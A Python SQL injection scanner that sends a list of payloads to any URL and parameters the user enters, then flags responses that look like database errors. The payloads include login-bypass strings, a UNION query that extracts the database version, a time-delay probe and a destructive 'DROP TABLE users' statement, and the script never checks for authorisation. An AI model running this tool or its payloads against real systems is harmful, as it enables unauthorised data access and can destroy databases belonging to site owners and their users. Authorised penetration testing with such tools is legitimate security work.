import requests
from urllib.parse import urlencode
import logging

# Configure logging
logging.basicConfig(
    filename="sql_injection_test.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# List of SQL injection payloads to test
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, version(), NULL--",
    "'; WAITFOR DELAY '0:0:10'--",
]

# Function to test for SQL injection
def test_sql_injection(base_url, params):
    """
    Tests a URL and parameters for SQL injection vulnerabilities.

    Args:
        base_url (str): The base URL of the target application.
        params (dict): A dictionary of query parameters to test.
    """
    logging.info(f"Starting SQL injection tests on {base_url}")

    for payload in payloads:
        # Update the parameter(s) with the payload
        test_params = {key: payload if key in params else value for key, value in params.items()}
        encoded_query = urlencode(test_params)
        url = f"{base_url}?{encoded_query}"

        logging.info(f"Testing URL: {url}")
        print(f"Testing URL: {url}")

        try:
            # Send the request
            response = requests.get(url, timeout=10)

            # Check response for common signs of SQL vulnerabilities
            if response.status_code == 200:
                if any(keyword in response.text.lower() for keyword in ["sql", "syntax", "error", "database"]):
                    logging.warning(f"Possible vulnerability detected with payload: {payload}")
                    print(f"[!] Possible vulnerability detected with payload: {payload}")
                else:
                    print(f"No immediate vulnerability detected with payload: {payload}")
            else:
                logging.error(f"Unexpected HTTP response {response.status_code} for payload: {payload}")
                print(f"Non-200 HTTP response for payload: {payload}")
        except requests.exceptions.Timeout:
            logging.error(f"Request timed out for payload: {payload}")
            print(f"[!] Request timed out for payload: {payload}")
        except Exception as e:
            logging.error(f"Error testing payload {payload}: {e}")
            print(f"[!] Error testing payload {payload}: {e}")

    logging.info("SQL injection tests completed.")

# Main function
if __name__ == "__main__":
    try:
        # URL and parameter(s) to test
        target_url = input("Enter the target URL (e.g., http://example.com/page): ").strip()
        param_string = input("Enter the query parameters as key=value pairs (e.g., id=123): ").strip()
        
        # Parse the query parameters into a dictionary
        params = dict(pair.split("=") for pair in param_string.split("&"))
        
        print("\nStarting SQL Injection tests...\n")
        test_sql_injection(target_url, params)
        print("\nTesting completed. Check the log file for details.")
    except Exception as e:
        logging.critical(f"Critical error in the script: {e}")
        print(f"[!] Critical error: {e}")
